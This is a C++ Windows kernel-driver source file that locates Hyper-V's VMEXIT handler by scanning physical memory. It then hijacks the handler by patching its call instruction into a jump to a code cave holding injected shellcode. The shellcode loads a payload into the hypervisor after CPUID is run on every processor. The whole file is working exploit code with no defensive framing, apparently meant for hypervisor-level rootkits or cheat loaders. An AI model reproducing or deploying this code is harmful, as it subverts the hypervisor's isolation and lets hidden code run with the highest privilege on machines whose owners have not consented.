#include "util.hpp"
NTSTATUS HijackVMExitHandler(PDISK disk, UINT64 exitHandlerAddress, PVOID pageBuffer, PVOID pageMapping, PHYSICAL_ADDRESS pdptPhysicalBase, UINT32 originalHookOffset, UINT32 entryPoint)
{
    if (disk == nullptr || pageBuffer == nullptr || pageMapping == nullptr || exitHandlerAddress == 0)
    {
        DbgMsg("HijackVMExitHandler invalid args");
        return STATUS_INVALID_PARAMETER;
    }

    auto CalcRel32 = [](UINT64 srcNextInstruction, UINT64 dst, INT32* outRel) -> bool
        {
            if (outRel == nullptr)
                return false;
            if (dst >= srcNextInstruction)
            {
                const UINT64 forward = dst - srcNextInstruction;
                if (forward > (UINT64)MAXLONG)
                    return false;
                *outRel = (INT32)forward;
                return true;
            }
            const UINT64 backward = srcNextInstruction - dst;
            if (backward > 0x80000000ull)
                return false;
            if (backward == 0x80000000ull)
            {
                *outRel = (INT32)0x80000000u;
                return true;
            }
            *outRel = -(INT32)backward;
            return true;
        };

    PUINT8 pageStart = (PUINT8)pageBuffer;
    PUINT8 bufferEnd = pageStart + PAGE_SIZE;
    PUINT8 callInstr = (PUINT8)exitHandlerAddress;
    if (callInstr < pageStart || (callInstr + 5) > bufferEnd || callInstr[0] != 0xE8)
    {
        DbgMsg("Unexpected VMEXIT hook location/opcode");
        return STATUS_INVALID_IMAGE_FORMAT;
    }

    const SIZE_T loaderSize = (SIZE_T)((UINT8*)ExecuteCPUID - (UINT8*)LoaderASM);
    const SIZE_T trampolineSize = loaderSize + 10; // loader + call + jmp
    PUINT8 afterCall = callInstr + 5;
    PUINT8 nearestCC = nullptr;
    SIZE_T selectedCcRun = 0;

    for (PUINT8 p = afterCall; p < bufferEnd; ++p)
    {
        if (*p != 0xCC)
            continue;
        SIZE_T ccRun = 0;
        while ((p + ccRun) < bufferEnd && p[ccRun] == 0xCC)
            ++ccRun;
        if (ccRun >= trampolineSize)
        {
            nearestCC = p;
            selectedCcRun = ccRun;
            break;
        }
    }
    if (nearestCC == nullptr)
    {
        DbgMsg("Failed to find contiguous CC cave");
        return STATUS_NOT_FOUND;
    }

    INT32 originalCallRel = *(INT32*)(callInstr + 1);
    PUINT8 originalCallTarget = callInstr + 5 + originalCallRel;
    INT32 offsetFromBaseOfPage = 0;
    if (!CalcRel32((UINT64)pageBuffer, (UINT64)originalCallTarget, &offsetFromBaseOfPage))
    {
        DbgMsg("Original target offset from page out of range");
        return STATUS_INTEGER_OVERFLOW;
    }

    DbgMsg("HijackVMExitHandler call=%p cave=%p ccRun=%Iu", callInstr, nearestCC, selectedCcRun);

    PUINT8 shellcode = (PUINT8)ExAllocatePool(NonPagedPoolNx, loaderSize);
    if (shellcode == nullptr)
        return STATUS_INSUFFICIENT_RESOURCES;
    memcpy(shellcode, (PVOID)LoaderASM, loaderSize);

    UINT32 marker64Count = 0, marker32aCount = 0, marker32bCount = 0;
    for (SIZE_T j = 0; j + sizeof(UINT64) <= loaderSize; ++j)
    {
        UINT64* candidate = (UINT64*)(shellcode + j);
        if (*candidate == 0xCAFEBABEDEADBEEF)
        {
            *candidate = pdptPhysicalBase.QuadPart;
            ++marker64Count;
        }
    }
    for (SIZE_T j = 0; j + sizeof(UINT32) <= loaderSize; ++j)
    {
        UINT32* candidate = (UINT32*)(shellcode + j);
        if (*candidate == 0xBABECAFE)
        {
            *candidate = (UINT32)offsetFromBaseOfPage;
            ++marker32aCount;
        }
        if (*candidate == 0xDEADBEEF)
        {
            *candidate = originalHookOffset;
            ++marker32bCount;
        }
    }
    if (marker64Count == 0 || marker32aCount == 0 || marker32bCount == 0)
    {
        ExFreePool(shellcode);
        DbgMsg("Loader marker patch failed");
        return STATUS_INVALID_IMAGE_FORMAT;
    }

    memcpy(nearestCC, shellcode, loaderSize);
    ExFreePool(shellcode);

    PUINT8 loaderEnd = nearestCC + loaderSize;
    INT32 loaderCallRel32 = 0, loaderJmpRel32 = 0;
    if (!CalcRel32((UINT64)(loaderEnd + 5), (UINT64)originalCallTarget, &loaderCallRel32) ||
        !CalcRel32((UINT64)(loaderEnd + 10), (UINT64)afterCall, &loaderJmpRel32))
    {
        DbgMsg("Loader call/jmp rel32 out of range");
        return STATUS_INTEGER_OVERFLOW;
    }
    loaderEnd[0] = 0xE8;
    *(INT32*)(loaderEnd + 1) = loaderCallRel32;
    loaderEnd[5] = 0xE9;
    *(INT32*)(loaderEnd + 6) = loaderJmpRel32;

    NTSTATUS status = DiskCopy(disk, pageMapping, pageBuffer);
    if (!NT_SUCCESS(status))
        return status;

    UINT8 originalCallInstruction[5];
    memcpy(originalCallInstruction, callInstr, sizeof(originalCallInstruction));

    INT32 entryPatchRel32 = 0;
    if (!CalcRel32((UINT64)(callInstr + 5), (UINT64)nearestCC, &entryPatchRel32))
        return STATUS_INTEGER_OVERFLOW;

    callInstr[0] = 0xE9;
    *(INT32*)(callInstr + 1) = entryPatchRel32;
    status = DiskCopy(disk, pageMapping, pageBuffer);
    if (!NT_SUCCESS(status))
        return status;

    status = ExecuteCPUIDEachProcessor();
    if (!NT_SUCCESS(status))
        return status;

    Sleep(1000);

    memcpy(callInstr, originalCallInstruction, sizeof(originalCallInstruction));
    status = DiskCopy(disk, pageMapping, pageBuffer);
    if (!NT_SUCCESS(status))
        return status;

    Sleep(1000);

    INT32 payloadJmpBackRel32 = 0;
    if (!CalcRel32((UINT64)(nearestCC + 18), (UINT64)afterCall, &payloadJmpBackRel32))
        return STATUS_INTEGER_OVERFLOW;

    memset(nearestCC, 0xCC, loaderSize);
    nearestCC[0] = 0x49;   // mov r10, imm64
    nearestCC[1] = 0xBA;
    *(UINT64*)(nearestCC + 2) = PAYLOAD_VIRTUAL_BASE + entryPoint;
    nearestCC[10] = 0x41;  // call r10
    nearestCC[11] = 0xFF;
    nearestCC[12] = 0xD2;
    nearestCC[13] = 0xE9;  // jmp afterCall
    *(INT32*)(nearestCC + 14) = payloadJmpBackRel32;

    status = DiskCopy(disk, pageMapping, pageBuffer);
    if (!NT_SUCCESS(status))
        return status;
    Sleep(1000);

    if (!CalcRel32((UINT64)(callInstr + 5), (UINT64)nearestCC, &entryPatchRel32))
        return STATUS_INTEGER_OVERFLOW;
    callInstr[0] = 0xE9;
    *(INT32*)(callInstr + 1) = entryPatchRel32;
    status = DiskCopy(disk, pageMapping, pageBuffer);
    if (!NT_SUCCESS(status))
        return status;

    DbgMsg("HijackVMExitHandler success entry=%p cave=%p", callInstr, nearestCC);
    return STATUS_SUCCESS;
}

NTSTATUS FindVMExitHandler(IN PDISK disk, OUT PVOID* mappingOut, OUT PVOID* bufferOut, OUT UINT64* exitHandlerAddressOut, OUT PPHYSICAL_MEMORY_RANGE* hyperVRange)
{
    PHYSICAL_ADDRESS highest;
    highest.QuadPart = MAXULONG32;

    PVOID buffer = MmAllocateContiguousMemory(PAGE_SIZE, highest);
    if (!buffer) {
        DbgMsg("Failed to allocate buffer\n");
        return 0;
    }

    PVOID foundAddress{ };
    PHYSICAL_ADDRESS mzHeaderAddress{ };
    PPHYSICAL_MEMORY_RANGE ranges = MmGetPhysicalMemoryRanges();
    if (ranges) {
        PPHYSICAL_MEMORY_RANGE range = ranges;
        while (range->BaseAddress.QuadPart) {

            if (foundAddress != 0)
                break;

            for (UINT64 i = 0; i < (UINT64)range->NumberOfBytes.QuadPart; i += PAGE_SIZE) {
                UINT64 pfn = (range->BaseAddress.QuadPart + i) >> PAGE_SHIFT;

                MM_COPY_ADDRESS src;
                src.PhysicalAddress.QuadPart = pfn << PAGE_SHIFT;

                SIZE_T outSize;
                if (!NT_SUCCESS(MmCopyMemory(buffer, src, PAGE_SIZE, MM_COPY_MEMORY_PHYSICAL, &outSize))) {
                    continue;
                }

                if (!IsPageAllOnes(buffer)) {
                    continue;
                }

                PVOID mapping = MmMapIoSpace(src.PhysicalAddress, PAGE_SIZE, MmNonCached);
                if (!mapping) {
                    continue;
                }

                if (!NT_SUCCESS(DiskCopy(disk, buffer, mapping))) {
                    MmUnmapIoSpace(mapping, PAGE_SIZE);
                    continue;
                }

                if (foundAddress == 0 && ScanPattern(buffer, (PUINT8)INTEL_VMEXIT_HANDLER_SIG, INTEL_VMEXIT_HANDLER_MASK, 11, &foundAddress)) {

                    *mappingOut = mapping;
                    *bufferOut = buffer;
                    *exitHandlerAddressOut = (UINT64)foundAddress;
                    *hyperVRange = range;

                    break;
                }
                MmUnmapIoSpace(mapping, PAGE_SIZE);
            }
            ++range;
        }
        ExFreePool(ranges);
    }
    else {
        DbgMsg("Failed to get physical memory ranges\n");
    }
    if (foundAddress == 0) {
        DbgMsg("Failed to find Hyper-V VMEXIT handler\n");
        return STATUS_UNSUCCESSFUL;
    }
    return STATUS_SUCCESS;
}

BOOLEAN IsHyperVRunning(VOID) {
    INT32 info[4] = { 0 };
    __cpuid(info, CPUID_HV_VENDOR_LEAF);
    return info[1] == 'rciM' && info[2] == 'foso' && info[3] == 'vH t';
}